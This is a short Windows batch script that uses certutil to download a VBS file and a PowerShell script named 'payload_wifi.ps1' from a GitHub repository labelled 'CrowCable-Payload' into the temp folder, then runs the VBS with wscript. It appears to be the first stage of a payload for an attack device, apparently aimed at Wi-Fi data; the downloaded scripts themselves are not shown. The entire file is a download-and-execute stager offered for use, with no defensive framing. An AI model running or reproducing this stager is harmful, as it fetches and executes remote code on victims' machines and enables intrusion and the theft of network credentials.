@echo off

certutil -urlcache -split -f "https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/payload_inicial_vbs.vbs" "%TEMP%\payload_inicial_vbs.vbs"

certutil -urlcache -split -f "https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/payload_wifi.ps1" "%TEMP%\payload_wifi.ps1"


wscript.exe "%TEMP%\payload_inicial_vbs.vbs"